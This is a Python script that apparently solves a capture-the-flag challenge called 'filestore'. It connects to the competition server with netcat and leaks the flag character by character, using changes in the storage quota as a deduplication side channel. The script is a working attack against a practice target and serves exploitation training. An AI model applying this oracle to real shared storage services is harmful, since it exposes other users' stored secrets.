import string
import subprocess
import sys

proc = subprocess.Popen(['nc', 'filestore.2021.ctfcompetition.com', '1337'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)

def read_quota() -> str:
    proc.stdin.write('status\n')
    proc.stdin.flush()
    for _ in range(2):
        proc.stdout.readline()
    quota = proc.stdout.readline()
    for _ in range(7):
        proc.stdout.readline()
    return quota

for _ in range(8):
    print(proc.stdout.readline(), end='', file=sys.stderr)
quota = read_quota()

valid_chars = '}' + string.ascii_uppercase + string.digits + '_' + string.ascii_lowercase + '-'

flag = 'CTF{'
while True:
    for next_char in valid_chars:
        print(f'Trying {flag + next_char}', file=sys.stderr)
        proc.stdin.write('store\n')
        proc.stdin.flush()
        proc.stdout.readline()
        proc.stdin.write(flag + next_char + '\n')
        proc.stdin.flush()
        for _ in range(8):
            proc.stdout.readline()
        new_quota = read_quota()
        print(new_quota, file=sys.stderr)
        if new_quota == quota:
            flag += next_char
            print(f'FLAG: {flag}', file=sys.stderr)
            if next_char == '}':
                sys.exit()
            break
        quota = new_quota
    else:
        print('No valid chars', file=sys.stderr)
        break
